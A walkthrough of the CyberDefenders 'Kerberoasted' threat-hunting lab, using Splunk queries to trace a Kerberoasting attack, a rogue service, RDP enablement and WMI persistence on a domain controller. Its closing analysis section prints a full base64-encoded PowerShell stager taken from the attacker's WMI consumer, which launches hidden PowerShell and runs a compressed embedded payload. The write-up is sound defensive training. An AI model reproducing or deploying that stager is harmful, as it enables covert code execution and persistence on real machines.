# <a href="https://cyberdefenders.org/blueteam-ctf-challenges/kerberoasted/">Kerberoasted</a>

**Platform:** CyberDefenders

**Scenario:** As a diligent cyber threat hunter, your investigation begins with a hypothesis: 'Recent trends suggest an upsurge in Kerberoasting attacks within the industry. Could your organization be a potential target for this attack technique?' This hypothesis lays the foundation for your comprehensive investigation, starting with an in-depth analysis of the domain controller logs to detect and mitigate any potential threats to the security landscape.

Your Domain Controller is configured to audit Kerberos Service Ticket Operations, which is necessary to investigate kerberoasting attacks. Additionally, Sysmon is installed for enhanced monitoring.

**Category:** Threat Hunting

**Difficulty:** Medium

**Files:** `N/A`

**Tools:** `Splunk Enterprise`

> [Splunk Enterprise](https://www.splunk.com/en_us/products/splunk-enterprise.html) is a platform for analyzing machine-generated big data. It indexes data from various sources, providing real-time insights, visualizations, and alerts, primarily for IT operations and security monitoring.

**Note:** In this walkthrough, CyberDefenders offers a lab environment for us to utilize. This feature is included with the PRO subscription.

## **Preparations** 

- I chose Splunk Enterprise for this lab.

  ![image](https://github.com/user-attachments/assets/d416f566-3997-46e1-b551-359b88b7502d)

- Wait for a couple of minutes to provision your lab environment.
  
  ![image](https://github.com/user-attachments/assets/b6aad2bb-8764-4347-bc4a-25b99a47009b)

- Login to `Splunk Enterprise`
  
  ![image](https://github.com/user-attachments/assets/620b911e-6ba3-4c5b-8ed0-8b4c28c4d043)

  ![image](https://github.com/user-attachments/assets/1897f06d-5acc-4700-8adf-8ab11e49ac75)

- Before we proceed, please read this [article](https://www.pingidentity.com/en/resources/identity-fundamentals/authentication-authorization-protocols/kerberos.html#:~:text=Kerberos%20is%20a%20passwordless%20computer%20network%20security%20authentication) about Kerberos as a review.

- For Splunk syntax (SPL), you can refer to the Splunk [documentation](https://docs.splunk.com/Documentation/Splunk/9.3.1/SearchReference/WhatsInThisManual).
  
## **Questions and Answers**

***1. What encryption type is currently in use within the network?***

- Windows uses this event ID 4769 for both successful and failed service ticket requests.

  ![image](https://github.com/user-attachments/assets/c51b8cae-c5e0-4578-8e54-a9ee89e8a1dd)

  > index="kerberoasted" winlog.event_id=4769

  ![image](https://github.com/user-attachments/assets/2b4bba81-3fd9-47c1-8106-68f566019503)

  ![image](https://github.com/user-attachments/assets/87376024-19bf-4651-adee-9a9691ad226a)

  > https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797#:~:text=While%20RC4%20has%20not%20been%20formally%20deprecated%20in

  **Answer: `RC4-HMAC`**

***2. What is the username of the account that sequentially requested Ticket Granting Service (TGS) for two distinct application services within a short timeframe?***

- We will use a Splunk query to narrow down the logs. Although there are other users exhibiting similar behavior, we chose this user based on the number of characters required for this question.

  ![image](https://github.com/user-attachments/assets/bd65afe6-cc90-4791-990a-8c17f72feae2)

  > index="kerberoasted" winlog.event_id=4769
  > |  stats count by winlog.event_data.TargetUserName winlog.event_data.ServiceName @timestamp
  > |  dedup winlog.event_data.TargetUserName winlog.event_data.ServiceName
  > |  sort -@timestamp

  **Answer: `johndoe`**

***3. Can you provide the account name of the compromised service account?***

- Of all the users detected, this is the only one that looks like a service account.

  ![image](https://github.com/user-attachments/assets/c291d62a-3729-4be7-a283-58b7b1f39da9)

  > index="kerberoasted" 
  > | stats values(winlog.event_id) as winlog.event_id values(event.action) as event.action count by winlog.event_data.TargetUserName
  
  ![image](https://github.com/user-attachments/assets/da63c3ee-e6c7-4000-bbf1-c814236b2e74)

  ![image](https://github.com/user-attachments/assets/71552609-59ad-473b-b09e-4e2f4d9de36d)

  > index="kerberoasted" event.action = "*kerberos*"
  > | stats values(winlog.event_id) as winlog.event_id values(event.action) as event.action count by winlog.event_data.TargetUserName

  **Answer: `SQLService`**

***4. What is the machine's IP address?***

- Use a custom query.

  ![image](https://github.com/user-attachments/assets/47042ae9-f30a-484a-8772-9a80b64edb17)

  > index="kerberoasted" winlog.event_data.TargetUserName="*SQLService*"
  > | stats values(winlog.event_id) as winlog.event_id values(event.action) as event.action count by winlog.event_data.IpAddress
  > | sort -@timestamp

  ![image](https://github.com/user-attachments/assets/313dd9c7-120d-458b-9ea7-f6d1550580b7)

  **Answer: `10.0.0.154`**

***5. Can you specify the service name installed on the Domain Controller (DC)?***

- The Event ID 7045 denotes that a service was installed on your server.

  ![image](https://github.com/user-attachments/assets/284971d0-4b69-41c4-a017-b88ce7027c20)

  > index="kerberoasted" winlog.event_id="7045"

  **Answer: `iOOEDsXjWeGRAyGl`**

***6. What's the complete registry key path where the attacker modified the value to enable Remote Desktop Protocol (RDP)?***

- Windows Security Log Event ID 4657 and Sysmon Event ID 13 indicate registry modifications.

  ![image](https://github.com/user-attachments/assets/9a46079c-6d74-430d-897b-b3dae047a897)

  > There are no results for the Windows event.
  
  ![image](https://github.com/user-attachments/assets/0af139b1-6199-4857-aa37-df668510901c)

  > Sysmon event.

  ![image](https://github.com/user-attachments/assets/306a5828-302f-4df1-a9c9-ce6d0a7b106a)

  **Answer: `HKLM\System\CurrentControlSet\Control\Terminal Server\fDenyTSConnections`**

***7. What is the UTC timestamp of the first recorded Remote Desktop Protocol (RDP) login event?***

- Event ID 4624 with Logon Type 10 indicates a successful 'RemoteInteractive' logon on a Windows system, meaning a user has logged in through Remote Desktop Protocol (RDP).

  ![image](https://github.com/user-attachments/assets/deb5a016-c8f8-4d39-8af2-777bff3a1c71)

  > index="kerberoasted" winlog.event_id=4624 winlog.event_data.LogonType=10

  **Answer: `16-10-2023 07:50:29`**

***8. What is the name of the WMI event consumer responsible for maintaining persistence?***

- Sysmon Event ID 20 indicates that a WMI (Windows Management Instrumentation) Event Consumer activity has been detected.

  ![image](https://github.com/user-attachments/assets/52281027-9733-4cf7-8f41-bf0bcb364c7c)

  > index="kerberoasted" winlog.event_id=20 winlog.event_data.EventType="\*wmi\*"

  **Answer: `Updater`**

***9. Which class does the WMI event subscription filter target in the WMI Event Subscription you've identified?***

- Sysmon Event ID 19 indicates that a WMI (Windows Management Instrumentation) Event Filter activity has been detected.

  ![image](https://github.com/user-attachments/assets/0738b09a-2c47-428a-af8a-30a53b8bae37)

  > index="kerberoasted" winlog.event_id=19 winlog.event_data.EventType="*wmi*"

- WMI Event Filter is used to define the conditions under which a WMI event is triggered. Filters can specify which system events should cause an action, allowing for more controlled and targeted monitoring or responses.

  **Answer: `Win32_NTLogEvent`**

## **Additional Analysis/Artifacts** 

- The Base64 string obtained from the WMI Consumer activity can be decoded using CyberChef.
  
  > aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnAH0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGkAcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQA7ACQAcwA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAUwB0AGEAcgB0AEkAbgBmAG8AOwAkAHMALgBGAGkAbABlAE4AYQBtAGUAPQAkAGIAOwAkAHMALgBBAHIAZwB1AG0AZQBuAHQAcwA9ACcALQBuAG8AbgBpACAALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAJgAoAFsAcwBjAHIAaQBwAHQAYgBsAG8AYwBrAF0AOgA6AGMAcgBlAGEAdABlACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAKAAoACcAJwBIADQAcwBJAEEAQQAzAHQATABHAFUAQwBBADcAVgBXAGIAVwArAGIAUwBCAEQAKwBYAHEAbgAvAEEAVgBXAFcAQQBNAGsAeAArAE8AWABhAEoAbABLAGwAVwAzAEMAdwBhAFUAeABDAGcAbAA5AGkAdQAxAFoARgBZAEcAMQB2AHYARwBZAEoATABIAEYAOAB2AGYANwAzAG0AegBVAFEATwAwAHIAUwB5ADUAMwBVAGwAUwB6AHYAeQA4AHoAcwA3AEQAUABQAHoARABEAFAAbwBvAEEAVABGAGsAawBiAEUAMABrAC8AMwByACsAVABpAHUASAA2AGkAYgArAFcAbABNAHIARABmAFQAMQBtAFYAYQBtAHkAdQBWAEgAMwBoAHgAVwArAE0ASwBVAHYAawBqAEoARgBjAGQAeABtAGEANQA5AEUAcwA1AE0AVABNADAAcwBTAEgAUABGADgAWAB7ADAAfQB0AGcAagB0AEkAVQByADIAOABvAHcAYQBtAGkAUwAnACcAKwAnACcAbgA5AEwAbwB5AFYATwA4AE4ASABGAHoAUwAwAE8AdQBQAFIARABxAG4AeQB2AGQAUwBpADcAOABXAGsAaAB0AGoAWAA5AFkASQBtAGwASQB4AFMARgA0AHEAegAnACcAKwAnACcASABBAGwALwA0AFYAZgBOAGkAUwByAGcAaQBmAC8AcwBtAHEAOQBPAGoAKwBxAHgAMgB7ADAAfQBwAGYANQBOAEYAVgBrAGIANQB0ACcAJwArACcAJwB5AHYASwA2AEYAbABNAHEAcQA5AEYATQBWAEYALwBhADMATQBWAFoAawBoAHcAUQBKAFMAOQBtAGMAMQAwAFkAawBhAGoAWgBxAGcAeQBqADEANQAvAGcAYwByAE4AMQBqAEIALwBNAGwAQwAxAE0AWgAzAHIASgAvAFQAWQBKADUAbABrAFMANwBSAHcAawByAHUAWQB3AGkAdwA5AFIATgBXAEkARABDAE0ATQBGAHAASwBsAHsAMAB9AGwAcQBiAEEALwBuAGMAMwArAFYASwBiAEYANQBWAGQAWgB4AE0AawBhADEAKwB5AEkANAA0AFQARgBIAGsANwB1AFMAWQBEAFQAVwB0AHsAMAB9AFAAUQBvAHEAdgA4AEgAdwBHAFcAaAA1AFAAUwBMAFMAWQBxAFMAcQBJADMAYgBNAFYAVgBpAHAAUgBSAG0AbABWACsAaQA5AG0AbABIAE8AOABLAGEARgA3AHEANQBKAHkAcQBBAFIAUwBMAGsALwBVAEsAawBUADAAKwAnACcAKwAnACcAVABNAGQARgBtAFkAVQA1ADQAcgB5AEMAMwA3AG0AJwAnACsAJwAnAEoARgBCAGgANQBFAFEAQQA5AEgANABLAEEATwBjAGwAZAAvAEQAMwBDADcAZgAzAEEAbgB2ADIARwArAFcAWQA3AGsANAB3AHUASwB5ADQATABDAFUANwAnACcAKwAnACcANwBTACsAUwBYAHAAVQBjAHUATgAzAG4ATABOAG4AQwBzAHQASgBQAE0AcQB6AE8ASABnAEcAWABLAHYARgAyAFYASAAyAHIAJwAnACsAJwAnAHMAWABxAHAAQwBYAHIAUgBXAE8ALwBEADEAbgBUAEkAUwBEAGoAYgBHADMAZwBTAC8AawBxAGMAQwBKAEgAWABxAGQAegBHAGMAeABMAGgAOQBqAGIAeQAxAHkAUQBvADIAYQBxADgARgBCAEkAJwAnACsAJwAnADgAcAAzAGkASABTAEsAMABVAE8AdwBmAC8ARgAnACcAKwAnACcATABrADQAdwBHAEUAYgBVADcAegB3AHUAVQBCAFoATQBPAE8AWgAyAHUAbQBhADgARQBkAGQASQB5AE0AMAB4AEEAawBLAEkASwB3AHAAewAnACcAKwAnACcAMAB9AEEAVQBSAFYANQA4ADYAawB3AGQATwBrAHsAMAB9ADMASQAnACcAKwAnACcAdwBXAHYAQQBMAGwAOABEAFYAUwB0AHoAeQBCAEYAJwAnACsAJwAnAGMAUwBoAGQANQBzAFMAMQB2AEYAMgBzAFEAawBrADMAcQBwADIAbABWAGMAagBOAEkAMABxAEEAcQB7ADAAfQBkAGkAbgBPAEsAeABLAEsARQBwAEoAYwBZAFEAeQB6AG4AWgBUAHsAMAB9AHsAMAB9ACsAdQBrADEARgBPAEEAagAvAGwAcABiAG0AWgArAGcAVABNADQAbABLAFQAUgBTAGwAUABzAGcAQgBpAEMAZwBEADAAdgBSAGcASAB4AEsAYwBDAGoANgByAFUASgBTAEUAMgB0AGgANQBaAGwASgBmAEwATAA2AEoAaAArAHAAUgBDADYAbwBDAGwAewAwAH0ANABnAEcANwBBAGcAVQBQAEMANgBZAGsAbwBDAGYAZwBoAFYAcQB6AGMAUABjAFgAcwBjACcAJwArACcAJwBVAHIAMABGAGsAVgB6AEUAcwA2AGkAKwBnAFAAaABUADUAcwBXAE8AVwB2ADgAQwBoAC8ASwBLAFgAWgBSAGIAawBsAEIAewAwAH0AZwBsAEcAZwBjACsAQQBpAFIAOQBpAGoAagBWAFcAbABJAEUAZwA3AFYAUgB3AEEAcwBtAFAAVgAvAFgASABoAHsAMAAnACcAKwAnACcAfQBkAHMAQQBYAE0AOABGAEYAVwBKAFEAeQB0ADYAYgBHAGwAZwB2AHUAVgB6AFoAegBWADkAQwB6AFEARwB7ADAAfQBIAFIAYwBJAEIAQgB5AHQAaABhADgATgBQADgAYwBkAFcAWABtAEMAVQBEADkAbwBGAGMAUgBHAE0AYwBiAHYAcgBFAFQAeABjAGsAYgBxADkAZwBaADgARAB2ADAASAA3AFUAMwBqADIAOQBiAGEAcgBrAGEAYgBOAG4ATQBCAE0AMwBZADcAMQBHAFoASAAnACcAKwAnACcATgBZAGgATgAnACcAKwAnACcAOABQAGsAZABCACsARABYAEUAeAA5ADYAdwB4AGIAMQBUAG0ANQBzAHUANgBsADQAUwAzAFcAZwB0AEEAMABQAHYAdwAzAHgAZwBjADcAdABqADgANwBHAE4AdQB2ADEAbABRAEgAVwAzADMAZABXADgAYwBhAHEAVABUAFgAZgBrAEIARwAzAGoAcgAwADAAagBCAFoASwAyAFcAdAAxAHIASABUAFcAYgByAFkAdQBtAHYAJwAnACsAJwAnAGcATABzAHgAcQBTACsAVwBLAEgAdwBmAEUAMAAyAEQAegAyAFkAUQB5AFcAOQA2AEIAbAAyAGEAdQBnADIAUABmADEAcQBYAHQAMgBNAEcAdABaAGsAUgBMAHQAYQB5ADEAcgBPAFIAeQB6ADEAUABvADcAYgBtAHEAWQBkAGgAMwA3AGIAMgBTAEoAawBzAEwARABwAGIASwAvAHIAVgA2AHoAZgBEAGQAWgBHAEsAMgBMAGEAcwBkAGwAYQBvAFYATwBFAHoATwBoADAAYQBCAG4AcwBiAEcAdwBrAHkATgBXAEcALwBpAEoAbQB3ADMARAB5AFIANgArAHgATQBCAEgAcQBmAEMASgA0AGMAagBtAHcAagBNAHQATAB5ADAAQwBEAHoAdQAxAGQAKwAxAGgAYgBhAE0AewAwAH0AagBhADMAOQBwAGoASQBZAE4ATQBvAG0AdgByADUAYQB3AHQAagBiAGQAUwAwAGYAVABXADMAYQBJAEgAOQBqAG4AMwBvAGcATQA3ADQAVQB0ADQAOAA2AHcASgB0AGMAKwA2AGsAMgAyAGwAcQBiAFYAeAAyAG4ARABYAHgAawBNAEcAUQBDAHMATgBiAGwARABuAHsAMAB9AFUANAB0AGwAdwBLACsAdgAxAEIAZwA2AEUAaABQAGQALwBMAFgAbgBiAGIAWgA4AEcAawAvAGkAbAAxAHYAbgB5AEEATwBFADQASABKAE8ATABOAHgAcQB6AHkARQBIAHEAaQB5AEwAMQAvAFYANwAnACcAKwAnACcAawA5AHkALwBCAEIATgBGACsAcgA0AFkANgBmAHAARQB1AGYAUQBwAFMAaABPAHAAZABwAFoAcgBIAEUASwBnAHEAdQB5ADQAagBRAFUAQgBUAFIAdABGAGMANABpAFQAQwBGAFIAZwB7ADAAfQB0AHMARwBRAG8AbwBwAFEARgBvAHQAcgBuAGwAUgBsAGEAVABkADQAQQBSAEQAOABhADIARAB1AHYAWABwAHEAcAAwAHEATwBnAHUAdQA4AEQANQBkAGIASgB5AFEAUwA4AEYAQwAxAGcANwB0AFoANgBPAEYAcgB3AFoAVgBWAC8AYQBPAG8ANgBsAEcALwA5AFEAVwAvAHQAMgBQADMAMgBwADUAawBzADMAaQByAEMAVgBsAFgAVQAvAHgAMAAwAGgAVwAyADYAcwB3ADMAbQB5AEYAeABTAGwATgA4AE8ARgBuAFIANQBEAGgAWABuAEYAMwBDADkAaABoAHoAYwB2AFkASQBpAEEAUwBVAHIAegAxADIAQgBuADgARQBZAFAAVQBTAHYAewAwAH0ATgBnAGoARwBRADcAQQBBADkAVABxADgAUABTAHAANgBQAEMAQwBKAEsAQgAvAGgATwAvAGcAUQAwAFMAMAB2ADgATgAyAFcAZwBuAFEANABMAGYAUwBwAGkAaABBAFMALwBnAEwALwA1AFUAMgArADcAMQBmAG4ATAA2AEoAUwBuAG8AMQBSACsAZgBaADkAdABPAE4AZwA4AHIAOQArAHkAQQBZACsAWQBTAEQAbwBBAHsAMAB9AGwAbABPAEsAOAByADcAKwBDAFIASgBFAHIAQgB5AEcARwA4AEUAQQBtAHoASQBzAGgAUABuAFkAdgBNAG4ANQAwAEQAcAA5AFAAdQAyAHIAKwBEADgAMgAzAEcAcABKAGsAQwB3AEEAQQAnACcAKQAtAGYAJwAnAGUAJwAnACkAKQApACkALABbAFMAeQBzAHQAZQBtAC4ASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQApACkAJwA7ACQAcwAuAFUAcwBlAFMAaABlAGwAbABFAHgAZQBjAHUAdABlAD0AJABmAGEAbABzAGUAOwAkAHMALgBSAGUAZABpAHIAZQBjAHQAUwB0AGEAbgBkAGEAcgBkAE8AdQB0AHAAdQB0AD0AJAB0AHIAdQBlADsAJABzAC4AVwBpAG4AZABvAHcAUwB0AHkAbABlAD0AJwBIAGkAZABkAGUAbgAnADsAJABzAC4AQwByAGUAYQB0AGUATgBvAFcAaQBuAGQAbwB3AD0AJAB0AHIAdQBlADsAJABwAD0AWwBTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAXQA6ADoAUwB0AGEAcgB0ACgAJABzACkAOwA=

  ![image](https://github.com/user-attachments/assets/3feaea8f-680b-49ae-b8d1-3c87692c03d2)

- I am not an expert when it comes to scripts, but here is what ChatGPT says:

  `This PowerShell script is designed to run a hidden instance of PowerShell that executes a command encoded in base64. It first determines the appropriate executable path based on the system architecture, sets up the command with parameters to avoid user interaction and visibility, and then decompresses and executes the base64-encoded command. This technique is often used for stealthy execution of scripts or commands in a way that evades detection by security software.`
